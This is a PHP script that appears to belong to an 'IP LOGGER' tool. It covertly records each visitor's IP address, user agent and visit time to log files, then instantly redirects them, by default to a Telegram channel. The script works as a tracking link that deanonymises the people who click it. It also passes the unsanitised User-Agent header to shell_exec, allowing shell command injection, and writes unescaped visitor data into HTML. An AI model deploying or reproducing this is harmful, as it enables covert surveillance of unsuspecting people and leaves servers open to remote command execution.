<?php

if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
}


$ua = $_SERVER['HTTP_USER_AGENT'];
$ua_output_html = shell_exec("bash User_Agent_Parser.sh \"$ua\" ");
$ua_output_text = shell_exec("bash User_Agent_Parser.sh \"$ua\" --text");

$save = fopen("_command","w");
$save_2 = fopen("saved_info.txt","a+");
date_default_timezone_set('Europe/Istanbul');
$tarih = date('d/m/Y H:i:s');
$command = ("
+-+-+ İP LOGGER +-+-+

 Tarih         : ".$tarih."

 İp Adresi     : ".$ipaddress."$ua_output_text
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
");
$saved_info = ("
<ul class='saved-box' style='padding-bottom:85px;'>
	<li class='saved-title'>İP LOGGER</li><br>
	<li>Tarih         : <a>$tarih</a></li>
	<li>İp Adresi     : <a href='/ip-scan/index.php?ip=$ipaddress'>$ipaddress</a></li>
	<li>$ua_output_html</li>
</ul><hr><br>
");
fwrite($save,$command);
fwrite($save_2,$saved_info);
fclose($save);
fclose($save_2);

$refresh_url = shell_exec('cat refresh_url |sed -n 1p');
if (empty($refresh_url)){
	$refresh_url = "https://t.me/umutkaratools";
	}
?>

<html>
<head>
<meta http-equiv="refresh" content="0;URL=<?php echo $refresh_url; ?>">
</head>
</html>

